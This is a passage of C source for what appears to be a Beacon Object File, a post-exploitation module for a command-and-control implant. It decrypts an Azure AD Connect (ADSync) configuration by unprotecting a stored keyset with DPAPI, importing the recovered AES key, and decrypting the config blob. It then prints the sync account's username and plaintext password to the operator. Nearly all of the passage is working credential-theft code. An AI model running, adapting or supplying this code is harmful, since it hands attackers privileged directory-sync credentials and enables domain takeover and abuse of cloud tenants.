            adSyncInstanceIdStr, API(KERNEL32, GetLastError)()
        );
        goto cleanup;
    }

    if (VERBOSE) {
        BeaconPrintf(CALLBACK_OUTPUT, "Successfully loaded keyset '%ls'.\n", adSyncCredentialKey);
    }

    adSyncEncryptedKeySetBlob.cbData = adSyncEncryptedKeyset->CredentialBlobSize;
    adSyncEncryptedKeySetBlob.pbData = adSyncEncryptedKeyset->CredentialBlob;

    adSyncEncryptedKeySetEntropyBlob.cbData = sizeof(adSyncKeyEntropyId);
    adSyncEncryptedKeySetEntropyBlob.pbData = &adSyncKeyEntropyId;

    // Decrypt the encrypted blob using DPAPI
    if (!API(CRYPT32, CryptUnprotectData)(&adSyncEncryptedKeySetBlob, NULL, &adSyncEncryptedKeySetEntropyBlob, NULL, NULL, CRYPTPROTECT_LOCAL_MACHINE | CRYPTPROTECT_UI_FORBIDDEN, &adSyncDecryptedKeySetBlob)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to decrypt keyset blob. Error code: 0x%lx\n", API(KERNEL32, GetLastError)());
        goto cleanup;
    }

    if (VERBOSE) {
        BeaconPrintf(CALLBACK_OUTPUT, "Successfully decrypted keyset '%ls' (%d bytes)\n", adSyncCredentialKey, adSyncDecryptedKeySetBlob.cbData);
    }

    // Decrypt the encrypted blob from the database using the obtained AES key
    if (!API(ADVAPI32, CryptAcquireContextW)(&hCryptoProvider, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed obtain cryptographic provider. Error code: 0x%lx\n", API(KERNEL32, GetLastError)());
        goto cleanup;
    }

    if (VERBOSE) {
        BeaconPrintf(CALLBACK_OUTPUT, "Successfully aquired crypto context\n");
    }

    BYTE key[KEY_SIZE];
    API(MSVCRT, memcpy)(key, adSyncDecryptedKeySetBlob.pbData + adSyncDecryptedKeySetBlob.cbData - KEY_OFFSET, KEY_SIZE);

    BYTE iv[IV_LENGTH];
    API(MSVCRT, memcpy)(iv, adSyncDecodedConfig + IV_OFFSET, IV_LENGTH);

    if (VERBOSE) {
        BeaconPrintf(CALLBACK_OUTPUT, "AES Key: ");
        for (int i = 0; i < KEY_SIZE; i++) BeaconPrintf(CALLBACK_OUTPUT, "%02X", key[i]);
        BeaconPrintf(CALLBACK_OUTPUT, "\n");

        BeaconPrintf(CALLBACK_OUTPUT, "AES IV: ");
        for (int i = 0; i < IV_LENGTH; i++) BeaconPrintf(CALLBACK_OUTPUT, "%02X", iv[i]);
        BeaconPrintf(CALLBACK_OUTPUT, "\n");
    }

    if (!API(ADVAPI32, CryptImportKey)(hCryptoProvider, &key, KEY_SIZE, NULL, 0, &hCryptoKey)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to import cryptographic key. Error code: 0x%lx\n", API(KERNEL32, GetLastError)());
        goto cleanup;
    }

    if (VERBOSE) {
        BeaconPrintf(CALLBACK_OUTPUT, "Successfully imported cryptographic key.\n");
    }

    DWORD mode = CRYPT_MODE_CBC;

    if (!API(ADVAPI32, CryptSetKeyParam)(hCryptoKey, KP_MODE, &mode, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to set crypto parameter KP_MODE. Error code: 0x%lx\n", API(KERNEL32, GetLastError)());
        goto cleanup;
    }

    if (!API(ADVAPI32, CryptSetKeyParam)(hCryptoKey, KP_IV, iv, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to set crypto parameter KP_IV. Error code: 0x%lx\n", API(KERNEL32, GetLastError)());
        goto cleanup;
    }

    if (VERBOSE) {
        BeaconPrintf(CALLBACK_OUTPUT, "Successfully set cryptographic options.\n");
    }

    BYTE* dataStart = adSyncDecodedConfig + IV_OFFSET + IV_LENGTH;
    DWORD dataLen = adSyncDecodedConfigSize - IV_OFFSET - IV_LENGTH;
    DWORD dataPadding = dataLen % BLOCK_SIZE;
    DWORD dataLenWithPadding = dataLen + dataPadding;

    adSyncDecryptedConfig = BofHeapAlloc(dataLenWithPadding);
    if (!adSyncDecryptedConfig) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to allocate padded data buffer. Error code: 0x%lx\n", API(KERNEL32, GetLastError)());
        goto cleanup;
    }

    adSyncDecryptedConfigASCII = BofHeapAlloc(dataLenWithPadding);
    if (!adSyncDecryptedConfigASCII) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to allocate padded data buffer (ascii). Error code: 0x%lx\n", API(KERNEL32, GetLastError)());
        goto cleanup;
    }

    API(MSVCRT, memcpy)(adSyncDecryptedConfig, dataStart, dataLen);

    if (!API(ADVAPI32, CryptDecrypt)(hCryptoKey, NULL, TRUE, 0, (BYTE*)adSyncDecryptedConfig, &dataLen)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to decrypt ADSync configuration. Error code: 0x%lx\n", API(KERNEL32, GetLastError)());
        goto cleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Successfully decrypted ADSync configuration.\n\n");
    API(MSVCRT, sprintf)(adSyncDecryptedConfigASCII, "%ls", adSyncDecryptedConfig);

    // Extract specific properties
    adSyncUsername = find_username(adSyncPrivateConfig);
    if (!adSyncUsername) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to find ADSync username, please look for it yourself: %s\n", adSyncPrivateConfig);
        goto cleanup;
    }

    adSyncPassword = find_password(adSyncDecryptedConfigASCII);
    if (!adSyncPassword) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to find ADSync password in ASCII blob, please look for it yourself: %s\n", adSyncDecryptedConfigASCII);
        goto cleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT,
        "\tADSync username: %s\n\tADSync password: %s",
        adSyncUsername, adSyncPassword
    );


cleanup:
    // Free resources in reverse order
    if (adSyncPassword) BofHeapFree(adSyncPassword);
    if (adSyncUsername) BofHeapFree(adSyncUsername);
    if (adSyncDecryptedConfigASCII) BofHeapFree(adSyncDecryptedConfigASCII);
    if (adSyncDecryptedConfig) BofHeapFree(adSyncDecryptedConfig);
    if (hCryptoKey) API(ADVAPI32, CryptDestroyKey)(hCryptoKey);
    if (hCryptoProvider) API(ADVAPI32, CryptReleaseContext)(hCryptoProvider, NULL);
    if (adSyncDecryptedKeySetBlob.pbData) API(KERNEL32, LocalFree)(adSyncDecryptedKeySetBlob.pbData);
    if (adSyncEncryptedKeyset) API(ADVAPI32, CredFree)(adSyncEncryptedKeyset);
    if (adSyncCredentialKey) BofHeapFree(adSyncCredentialKey);
    if (hAdSyncProcessTokenDup != NULL) API(ADVAPI32, RevertToSelf)();
    if (hAdSyncProcessTokenDup != NULL) API(KERNEL32, CloseHandle)(hAdSyncProcessTokenDup);
    if (hAdSyncProcessToken != NULL) API(KERNEL32, CloseHandle)(hAdSyncProcessToken);
    if (hAdSyncProcess != NULL) API(KERNEL32, CloseHandle)(hAdSyncProcess);
    if (adSyncDecodedConfig) BofHeapFree(adSyncDecodedConfig);
    if (adSyncPrivateConfig) BofHeapFree(adSyncPrivateConfig);
    if (adSyncEncryptedConfig) BofHeapFree(adSyncEncryptedConfig);
    if (sqlStmtHandle) API(ODBC32, SQLFreeHandle)(SQL_HANDLE_STMT, sqlStmtHandle);
    if (sqlConnected) API(ODBC32, SQLDisconnect)(sqlConnHandle);
    if (sqlConnHandle) API(ODBC32, SQLFreeHandle)(SQL_HANDLE_DBC, sqlConnHandle);
    if (sqlEnvHandle) API(ODBC32, SQLFreeHandle)(SQL_HANDLE_ENV, sqlEnvHandle);
    if (sqlConnectionString) BofHeapFree(sqlConnectionString);
    if (hProcessSnapshot != NULL && hProcessSnapshot != INVALID_HANDLE_VALUE) API(KERNEL32, CloseHandle)(hProcessSnapshot);
    return;
}
